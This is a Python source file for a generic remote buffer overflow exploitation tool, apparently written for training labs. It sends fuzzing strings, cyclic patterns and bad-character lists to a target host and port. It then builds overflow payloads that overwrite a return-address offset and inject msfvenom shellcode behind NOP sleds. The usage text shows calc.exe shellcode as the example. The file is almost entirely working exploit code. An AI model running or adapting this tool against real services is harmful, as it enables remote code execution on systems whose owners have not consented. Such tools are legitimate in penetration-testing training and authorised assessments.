#!/usr/bin/python3
#
# ig-buffer-overflow.py
#
# Isabelle's generic buffer overflow tool
#
# https://github.com/isabellecda/cyber-scripts
#

import sys
import socket
import binascii
import os
import getopt

VERBOSE = False

# Script usage
def print_usage(scriptName):
	print("Usages:")
	print("")
	print("test - Sends simple string (AAAAA) with buffer size and buffer head for memory test")
	print(" {} -m test --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'".format(scriptName))
	print("")

	print("cyclic - Sends cyclic pattern to help identify memory positions")
	print(" {} -m cyclic --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'".format(scriptName))
	print("")

	print("checkoffset - Auxiliary mode for offset detection on pattern")
	print(" {} -m checkoffset --value=31704331 --length=5000".format(scriptName))
	print("")

	print("write - Writes hex value to buffer offset")
	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809".format(scriptName))
	print("")
	
	print("write - Writes hex value to buffer offset and additional content before and/or after the offset content")
	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --before=90909090 --after=9090".format(scriptName))
	print("")

	print("write - Writes badchars (before or after offset content) for badchar verification")
	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --after=badchar --exclude=000a".format(scriptName))
	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --before=badchar --exclude=000a".format(scriptName))
	print("")
	
	print("write - Sends malicious shell code (hex string file) via buffer overflow")
	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --before=shellcode --shellcode=opencalc --nops=10".format(scriptName))
	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --after=shellcode --shellcode=opencalc".format(scriptName))
	print("")

	print("Parameters:")
	print("")
	print(" --help|-h	: Show script usage.")
	print(" --norec|-n	: Don't wait for receive message after connect.")
	print(" --mode|-m	: Select script mode (test|cyclic|write|checkoffset).")
	print(" --rhost		: Remote host IP.")
	print(" --rport		: Remote host port.")
	print(" --buffsize	: Amount of variable bytes to send.")
	print(" --buffhead	: Static buffer string set at the beginning of the buffer.")
	print("		 Is usually the crash string. Size is considered in buffSize calc.")
	print(" --interact	: Interact with the application before sending the payload. For each message in string (separated with ';;'), sends and receives response from app.")
	print("		 Example: --interact='login;;user' --> Sends 'login', gets response, sends 'user', gets response, and finally sends the generated payload")
	print(" --offset	: Place in buffer where content can be added.")
	print(" --hexcontent	: Hex string to add at the offset position.")
	print("		Can be considered as big endian (default) or little endian (will be reversed).")
	print("		Use 'g' or 'l' to delimit the order. Examples:")
	print("		'g01020304l05060708' --> will send '0102030408070605'")
	print("		'01020304' --> will send '01020304'")
	print(" --before|after	: Writes additional content (hex string) before and/or after the offset content.")
	print("		If content is 'badchar', content will be a generated badchar list. Used for bad char testing.")
	print("		If content is 'shellcode', --shellcode parameter will be expected")
	print(" --exclude	: List of chars (formatted as hex string) to be excluded from badchar list.")
	print(" --shellcode	: Hex shell code file generated using msfvenom. Example:")
	print("		msfvenom -p windows/exec cmd=calc.exe -b '\\x00' -f hex EXITFUNC=thread -o opencalc")
	print(" --nopsb|nopsa	: Amount of nops to add before and/or after the additional write content (be if badchars, shellcode or simple hexstring). Default is 0.")
	print(" --value		: Offset value.")
	print(" --length	: Cyclic pattern length.")
	print(" --flush		: Adds '\\r\\n' at the end of the payload.")


# Auxiliary functions ###################################################################
#########################################################################################

# Creates cyclic pattern
# Adapted from: https://github.com/ickerwx/pattern/blob/master/pattern
def create_cyclic_pattern(length = 8192):
	pattern = ''
	parts = ['A', 'a', '0']

	while len(pattern) != length:
		pattern += parts[len(pattern) % 3]
		if len(pattern) % 3 == 0:
			parts[2] = chr(ord(parts[2]) + 1)
			if parts[2] > '9':
				parts[2] = '0'
				parts[1] = chr(ord(parts[1]) + 1)
				if parts[1] > 'z':
					parts[1] = 'a'
					parts[0] = chr(ord(parts[0]) + 1)
					if parts[0] > 'Z':
						parts[0] = 'A'
	
	#print("Cyclic pattern:", pattern) if VERBOSE else None

	return pattern

# Verifies pattern offset
def check_pattern_offset(value, length = 8192):
	pattern = create_cyclic_pattern(length)
	hexvalue = binascii.unhexlify(hex_reverse(value)).decode()
	
	try:
		return pattern.index(hexvalue)
	except ValueError:
		return 'Not found'

# Checks if hex string value is valid
def is_valid_hex(content, size):
	if len(content) % 2 != 0:
		return False

	# Check if it is valid hex value
	try:
		intVal = int(content, 16) 
	except:
		return False

	if size == 0 or len(content) == size:
		return True
	
	return False

# Creates bad char string
# Example: create_bad_chars(0,'000a')
# Adapted from: https://gist.github.com/rverton/64589ac9f5c035100ab40501b17cdf63
def create_bad_chars(start, excludeChars):
	if excludeChars and not is_valid_hex(excludeChars, 0):
		print("Error: excludeChars is not a valid hex string")
		sys.exit(1);


	hexChars = [excludeChars[i:i+2] for i in range(0, len(excludeChars), 2)]
	exclude = [int(i, 16) for i in hexChars]

	print("Excluded bad chars:", hexChars) if VERBOSE else None

	badChars = ""

	for nr in range(start,255+1):
		if nr in exclude:
			continue
		badChars = badChars + '{:02x}'.format(nr)

	return binascii.unhexlify(badChars)

# Reverses hex string
def hex_reverse(value):
	values = value if isinstance(value, list) else [value]
	reverseVal = ""

	for val in values:
		reverseVal = reverseVal + "".join(reversed([val[i:i+2] for i in range(0, len(val), 2)]))

	return reverseVal

# Gets binary content
# ./ig_buffer_overflow.py write 10.2.31.155 2048 5009 'cmd2 /.:/' 1203 l0102030405g0607080910l1122l44
def get_binary_content(writeContent):
	if not is_valid_hex(writeContent.replace("g", "").replace("l", ""), 0):
		print("Error: hexcontent is not a valid hex string")
		sys.exit(1);

	finalContent = ""

	gSplit = writeContent.split("g")
	for content in gSplit:
		if "l" in content:
			lSplit =  content.split("l")
			finalContent = finalContent + lSplit[0] + hex_reverse(lSplit[1:])
		else:
			finalContent = finalContent + content
				
	print("Binary content:", finalContent) if VERBOSE else None

	return binascii.unhexlify(finalContent)

# Get shell code from shell code file
def get_shell_code(shellCodeFile):
	if not os.path.exists(shellCodeFile):
		print("Error: --shellcode param is not a valid file")
		sys.exit(1);
	
	with open(shellCodeFile) as f: shellCodeStr = f.read()
	return binascii.unhexlify(shellCodeStr)



# Create payload functions ##############################################################
#########################################################################################

# test
def create_test_payload(buffHead, buffSize):
	buff = b'A' * buffSize
	payload = buffHead + buff

	return payload

# cyclic
def create_cyclic_payload(buffHead, buffSize):
	cyclicPattern = create_cyclic_pattern(buffSize)
	payload = buffHead + cyclicPattern.encode()

	return payload

# write
def create_write_payload(buffHead, buffSize, offsetCount, binContent):
	# offset
	offset = b'A' * int(offsetCount)

	# tail
	tail = b'C' * (buffSize - len(offset) - len(binContent))

	# payload
	payload = buffHead + offset + binContent + tail

	return payload

# write - additional content (before or after hexcontent at offset)
def create_write_payload_additional(buffHead, buffSize, offsetCount, binContent, beforeContent, afterContent, nopsbSize = 0, nopsaSize = 0):	
	# nops
	nopsb = b'\x90' * nopsbSize
	nopsa = b'\x90' * nopsaSize

	# offset
	offset = b'A' * (offsetCount - len(nopsb) - len(beforeContent) - len(nopsb) )

	# tail
	tail = b'Z' * (buffSize - len(offset) - len(nopsb) - len(beforeContent) - len(nopsb) - len(binContent) - len(nopsa) - len(afterContent) - len(nopsa))
	
	# payload
	payload = buffHead + offset + nopsb + beforeContent + nopsb + binContent + nopsa + afterContent + nopsa + tail		

	return payload



# Main execution block ##################################################################
#########################################################################################

if __name__ == "__main__":
	DEFAULT_SOCKET_BUFF_SIZE = 1024
	scriptName = sys.argv[0]

	# Avaiable modes
	AVAILABLE_MODES = ["test", "cyclic", "write", "checkoffset"]

	# Input parameters
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hnvfm:", ["help", "norec", "verbose", "flush", "mode=", "rhost=", "rport=", "buffhead=", "buffsize=", "offset=", "hexcontent=", "before=", "after=", "exclude=", "shellcode=", "nopsb=", "nopsa=", "interact=", "value=", "length="])
	except getopt.GetoptError as err:
		print("Error:", err)
		print_usage(scriptName)
		sys.exit(1)	
	
	# Default values
	norec = False
	mode = ""
	
	rhost = ""
	rport = 0
	
	buffSizeParam = 0
	buffHead = b''
	
	offset = 0
	hexContent = ""
	
	badCharExcluded = ""
	shellCodeFile = ""
	
	nopsa = 0
	nopsb = 0
	interact = []
	
	patternValue = ""
	patternLength = 8192
	
	before = ""
	after = ""
	
	flush = False

	# Verify options
	for opt, value in opts:
		if opt in ("-h", "--help"):
			print_usage(scriptName)
			sys.exit(1)	
		elif opt in ("-n", "--norec"):
			norec = True
		elif opt in ("-v", "--verbose"):
			VERBOSE = True
		elif opt in ("-f", "--flush"):
			flush = True
		elif opt in ("-m", "--mode"):
			mode = value
			if mode not in AVAILABLE_MODES:
				print("Error: unknown mode.")
				print_usage(scriptName)
				sys.exit(1);
		elif opt == '--rhost':
			rhost = value
		elif opt == '--rport':
			rport = int(value)
		elif opt == '--buffhead':
			buffHead = str.encode(value)
		elif opt == '--buffsize':
			buffSizeParam = int(value)
		elif opt == '--offset':
			offset = int(value)
		elif opt == '--hexcontent':
			hexContent = value
		elif opt == '--before':
			before = value
		elif opt == '--after':
			after = value
		elif opt == '--exclude':
			badCharExcluded = value
		elif opt == '--shellcode':
			shellCodeFile = value
		elif opt == '--nopsa':
			nopsa = int(value)
		elif opt == '--nopsb':
			nopsb = int(value)
		elif opt == '--interact':
			interact = value.split(";;")
		elif opt == '--value':
			patternValue = value
		elif opt == '--length':
			patternLength = int(value)
		else:
			print("Error: Unknown parameter")
			print_usage(scriptName)
			sys.exit(1)

	print("Arguments: mode={} | norec={} | rhost={} | rport={} | buffhead={} | buffsize={} | offset={} | hexcontent={} | before={} | after={} | exclude={} | shellcode={} | nopsb={} | nopsa={} | interact={} | value={} | length={} | flush={}".format(mode, norec, rhost, rport, buffHead, buffSizeParam, offset, hexContent, before, after, badCharExcluded, shellCodeFile, nopsb, nopsa, interact, patternValue, patternLength, flush)) if VERBOSE else None

	# Tool
	if not mode:
		print("Error: script mode must be set.")
		print_usage(scriptName)
		sys.exit(1);

	# Checkoffset
	if mode == "checkoffset" and not patternValue:
		print("Error: incorrect number of params for --checkoffset.")
		sys.exit(1);
	elif mode == "checkoffset":
		patternOffset = check_pattern_offset(patternValue, patternLength)
		print("Offset for length {}: {}".format(patternLength, patternOffset))
		sys.exit(0)

	# Other modes minimum params
	if not rhost or not rport or not buffSizeParam:
		print("Error: incorrect minimum number of params.")
		print_usage(scriptName)
		sys.exit(1);

	# Calc buff size
	buffSize = buffSizeParam - len(buffHead)
	buffPayload = ""

	# Verify mode to create payload
	if mode == "test":
		buffPayload = create_test_payload(buffHead, buffSize)

	elif mode == "cyclic":
		buffPayload = create_cyclic_payload(buffHead, buffSize)

	elif mode == "write":
		if not hexContent:
			print("Error: incorrect number of params for --mode=write.")
			sys.exit(1);

		binContent = get_binary_content(hexContent)
		beforeContent = ""
		afterContent = ""
		
		if before == "badchar":
			beforeContent = create_bad_chars(0, badCharExcluded)
		elif before == "shellcode":
			beforeContent = get_shell_code(shellCodeFile)
		elif before:
			beforeContent = get_binary_content(before)
		else:
			beforeContent = b''
			
		if after == "badchar":
			afterContent = create_bad_chars(0, badCharExcluded)
		elif after == "shellcode":
			afterContent = get_shell_code(shellCodeFile)
		elif after:
			afterContent = get_binary_content(after)
		else:
			afterContent = b''
		
		if beforeContent or afterContent:
			# Write additional
			buffPayload = create_write_payload_additional(buffHead, buffSize, offset, binContent, beforeContent, afterContent, nopsb, nopsa)
		else:
			# Simple write
			buffPayload = create_write_payload(buffHead, buffSize, offset, binContent)
	else:
		print("Error: incorrect number of params.")
		print_usage(scriptName)
		sys.exit(1);


	print("") if VERBOSE else None

	# Create socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		# Connect to rhost and rport
		connect = s.connect((rhost, rport))

		print("Started socket communication") if VERBOSE else None

		# Application connection return
		if not norec:
			r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)	
			print(r) if VERBOSE else None

		# Interact with the application before sending the payload		
		for tValue in interact:
			print("") if VERBOSE else None
			tValue = tValue + "\r\n"
			interactValue = tValue.encode()	
			print("App interaction, sending: [{}]".format(interactValue)) if VERBOSE else None
			s.send(interactValue)

			# Application payload return
			print("Return:") if VERBOSE else None
			r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)	
			print(r) if VERBOSE else None

		# Send payload
		print("") if VERBOSE else None
		print("Sending payload with size {}".format(len(buffPayload))) if VERBOSE else None
		print(buffPayload) if VERBOSE else None
		print("") if VERBOSE else None

		if flush:
			buffPayload = buffPayload + "\r\n".encode()
	
		s.send(buffPayload)

		# Application payload return
		r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)

		print("Payload return:") if VERBOSE else None
		print(r) if VERBOSE else None

	except KeyboardInterrupt:
		print("Exit: Keyboard Interrupt")
	except:
		print("Error: Unexpected error.", sys.exc_info()[0])
		raise
	finally:
		s.close()

